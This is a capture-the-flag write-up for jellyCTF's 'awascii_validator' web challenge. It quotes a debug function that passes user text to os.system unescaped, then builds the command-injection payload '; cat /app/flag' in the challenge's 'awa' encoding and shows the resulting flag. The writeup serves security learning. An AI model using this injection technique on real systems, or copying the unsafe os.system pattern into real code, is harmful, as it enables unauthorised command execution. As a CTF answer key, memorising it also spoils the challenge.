# [web] awascii_validator

<table><tbody>
<tr><th>Value</th><td>304 pts</td></tr>
<tr><th>Tags</th><td><code>medium</code></td></tr>
<tr><th>Author</th><td>Sheepiroo</td></tr>
<tr><th>Connection info</th><td><a href="https://awascii-validator.jellyc.tf/">https://awascii-validator.jellyc.tf/</a></td></tr>
<tr><th>Files</th><td><a href="./files/awascii_validator.zip">awascii_validator.zip</a></td></tr>
</tbody></table>

Learning a new language is hard... maybe this could help with practice

10 point hint: Where to start looking

---

raw notes:

  - goal is to trick the naive `debug` function:
    ```py
    # custom debug function
    def debug(text):
        os.system('''echo {}'''.format(text))
    ```
  - we want a string like `; cat /app/flag` so it gets run as `echo ; cat /app/flag`
      - there's no "x" in the mapping, so I guess that's why this flag doesn't have the `.txt` extension
  - awascii starts with `awa` (see `awascii_to_text`). then it's `awa` for 0 and `wa` for 1, with spaces in between (see `awascii_to_binary_string`). using `AWASCII_MAP` (in `awafier_maps`), we get: `awa wa wa wa wa wa awa wa wa awa wa awa awa awa wa wa wa awa wa awa awa awa awa wa awa awa wa wa wa wa wa wa wa awa wa awa awa wa wa wa wa awa wa awa awa awa awa wa awa awa wa wa wa awa awa awa wa wa wa awa awa wa wa wa wa awa wa wa awa awa wa wa wa awa wa awa awa awa awa awa awa awa awa wa awa wa awa wa awa awa awa`
    ```
        ";": 62, # 111110 => wa wa wa wa wa awa
        " ": 52, # 110100 => wa wa awa wa awa awa
        "c": 29, # 011101 => awa wa wa wa awa wa
        "a":  2, # 000010 => awa awa awa awa wa awa
        "t": 31, # 011111 => awa wa wa wa wa wa
        "/": 61, # 111101 => wa wa wa wa awa wa
        "p": 28, # 011100 => awa wa wa wa awa awa
        "f": 39, # 100111 => wa awa awa wa wa wa
        "l": 16, # 010000 => awa wa awa awa awa awa
        "g": 40, # 101000 => wa awa wa awa awa awa
    
    awa                    # header
    wa wa wa wa wa awa     # ";"
    wa wa awa wa awa awa   # " "
    awa wa wa wa awa wa    # "c"
    awa awa awa awa wa awa # "a"
    awa wa wa wa wa wa     # "t"
    wa wa awa wa awa awa   # " "
    wa wa wa wa awa wa     # "/"
    awa awa awa awa wa awa # "a"
    awa wa wa wa awa awa   # "p"
    awa wa wa wa awa awa   # "p"
    wa wa wa wa awa wa     # "/"
    wa awa awa wa wa wa    # "f"
    awa wa awa awa awa awa # "l"
    awa awa awa awa wa awa # "a"
    wa awa wa awa awa awa  # "g"
    ```
  - `jellyCTF{m4st3rs_1n_awat1sm}`
